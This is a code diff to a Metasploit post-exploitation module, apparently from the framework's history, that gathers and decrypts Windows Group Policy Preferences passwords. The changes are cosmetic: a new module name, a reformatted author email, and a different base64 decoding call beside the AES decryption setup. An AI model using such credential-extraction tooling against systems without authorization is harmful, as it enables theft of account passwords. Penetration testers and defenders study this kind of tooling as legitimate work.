@@ -13,7 +13,6 @@ require 'msf/core'
 require 'msf/core/post/windows/registry'
 
 require 'rexml/document'
-require 'base64'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
@@ -21,7 +20,7 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Decrypt the password of local users added via Windows 2008 Group Policy Preferences.',
+				'Name'          => 'Windows Gather Group Policy Preferences Password Extraction',
 				'Description'   => %q{
 					Meterpreter script that search for GPO local users password - win2k8
 					Based on Gpprefdecrypt.py - Decrypt the password of local users added
@@ -33,7 +32,7 @@ class Metasploit3 < Msf::Post
 				'License'       => MSF_LICENSE,
 				'Author'        =>
 					[
-						'Loic Jaquemet <loic.jaquemet+msf@gmail.com>',
+						'Loic Jaquemet <loic.jaquemet+msf [at] gmail.com>',
 					],
 				'Version'       => '$Revision$',
 				'Platform'      => [ 'windows' ],
@@ -59,7 +58,7 @@ class Metasploit3 < Msf::Post
 	".gsub(" ","").gsub("\n","")].to_a.pack("H*")
 
 		cpassword += '='*((4 - cpassword.size.modulo(4)).modulo(4))
-		encoded = Base64.decode64(cpassword)
+		encoded = Rex::Text.decode_base64(cpassword)
 		# decode
 		aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
 		aes.padding = 0
